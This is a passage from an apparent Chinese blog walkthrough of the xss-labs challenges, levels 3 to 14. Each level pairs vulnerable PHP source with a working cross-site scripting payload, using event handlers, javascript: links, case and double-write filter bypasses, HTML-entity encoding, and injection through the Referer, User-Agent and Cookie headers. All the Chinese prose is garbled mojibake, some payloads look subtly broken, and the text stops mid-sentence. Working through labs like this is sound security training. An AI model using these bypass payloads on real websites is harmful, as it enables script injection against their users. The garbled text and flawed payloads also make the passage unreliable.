class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars($str)</code>å¯¹å‚æ•°è¿›è¡Œäº†htmlè½¬ä¹‰ï¼Œæ‰€ä»¥ä¸èƒ½å«æœ‰&lt;&gt;</p><p>å¯ä»¥ä½¿ç”¨onfocusé…åˆjavascript ä¼ªåè®®æ¥æ‰§è¡Œjavascript ä»£ç <code>onfocus=javascript:alert()</code>,ä¹‹åè¦ç‚¹å‡»ä¸€äº›æ–‡æœ¬æ¡†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onfocus=javascript:alert() &#x27;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> &#x27;&#x27;&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨onmouseover='alert()'æ¥æ„æˆxssï¼Œé¼ æ ‡è¦ç§»åŠ¨åˆ°æ–‡æœ¬æ¡†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-attr">onmouseover</span>=<span class="hljs-string">&#x27;alert()&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel4php"><a class="markdownIt-Anchor" href="#xss-lablevel4php"></a> xss-lab/level4.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onfocus=javascript:alert() &quot;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">onfocus</span>=<span class="hljs-string">javascript:alert()</span> &quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel5php"><a class="markdownIt-Anchor" href="#xss-lablevel5php"></a> xss-lab/level5.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><p>script,onéƒ½è¢«è¿‡æ»¤ï¼Œå€ŸåŠ©href</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>hhh<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>hhh<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;&quot;&gt;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel6php"><a class="markdownIt-Anchor" href="#xss-lablevel6php"></a> xss-lab/level6.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰è½¬å°å†™ï¼Œå¯ä»¥å¤§å†™ç»•è¿‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;Onfocus=javascript:alert() <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">Onfocus</span>=<span class="hljs-string">javascript:alert()</span> &quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel7php"><a class="markdownIt-Anchor" href="#xss-lablevel7php"></a> xss-lab/level7.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">åŒå†™ç»•è¿‡<br>&quot;Oonnfocus=javascript:alert() <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span><span class="hljs-attr">onfocus</span>=<span class="hljs-string">java:alert()</span> &quot;&gt;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel8php"><a class="markdownIt-Anchor" href="#xss-lablevel8php"></a> xss-lab/level8.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">ç¼–ç ç»•è¿‡<br>hrefæœ‰å±æ€§è‡ªåŠ¨Unicodeè§£ç ,å¦‚æœæ³¨å…¥ç‚¹å†hrefä¸­ï¼Œå¯ä»¥è¿›è¡Œunicodeç¼–ç <br>å°†javascript:alert()è¿›è¡Œunicodeç¼–ç ï¼š<span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel9php"><a class="markdownIt-Anchor" href="#xss-lablevel9php"></a> xss-lab/level9.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">å¿…é¡»å«æœ‰http:<span class="hljs-comment">//ï¼Œ è¿˜è¦ç¼–ç ç»•è¿‡</span><br>&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;<span class="hljs-string">&#x27;http://&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel10php"><a class="markdownIt-Anchor" href="#xss-lablevel10php"></a> xss-lab/level10.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;keyword&quot;];<br>$str11 = $_GET[&quot;t_sort&quot;];<br>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);<br>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);<br>echo &quot;<span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>&quot;.&#x27;<span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">search</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">è¿‡æ»¤äº† &lt;  &gt;  ,keywordè¢«htmlè½¬ä¹‰ï¼Œç»“æœè¿˜è¢«éšè—<br>æºç å¯ä»¥çœ‹åˆ°t_sortæœ‰XSSæ¼æ´<br>t_sort=<span class="hljs-string">&quot;onfocus=javascript:alert() type=&quot;</span><span class="hljs-built_in">text</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="xss-lablevel11php"><a class="markdownIt-Anchor" href="#xss-lablevel11php"></a> xss-lab/level11.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨å…¥ç‚¹åœ¨referer,å¯ä»¥é€šè¿‡bpæŠ“åŒ…ä¿®æ”¹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Referer:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel12php"><a class="markdownIt-Anchor" href="#xss-lablevel12php"></a> xss-lab/level12.php</h4><p>æŸ¥çœ‹æºç ï¼Œå‘ç°æ³¨å…¥ç‚¹åœ¨user-agentï¼Œé€šè¿‡bpæŠ“åŒ…ä¿®æ”¹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">User-Agent:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel13php"><a class="markdownIt-Anchor" href="#xss-lablevel13php"></a> xss-lab/level13.php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookieä½œä¸ºæ³¨å…¥ç‚¹ï¼ŒbpæŠ“åŒ…ä¿®æ”¹cookie</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Cookie:&quot;onfocus=javascript:alert() type=&quot;text&quot;&quot;<br></code></pre></td></tr></table></figure><h4 id="xss-lablevel14php"><a class="markdownIt-Anchor" href="#xss-lablevel14php"></a> xss-lab/level14.php</h4><p>Exif xss</p><p>Exif å¯äº¤æ¢å›¾åƒæ–‡ä»¶æ ¼å¼ï¼Œæ˜¯ä¸“é—¨ä¸ºæ•°ç ç›¸æœºçš„ç…§ç‰‡è®¾å®šçš„ï¼Œå¯è®°å½•æ•°ç ç…§ç‰‡çš„å±æ€§ä¿¡æ¯å’Œæ‹æ‘„æ•°æ®ã€‚</p><p>æœ‰äº›ç½‘ç«™å¯ä»¥è¯»å–exif ä¿¡æ¯ï¼Œå½“ä¼ å…¥ä¸€å¼ 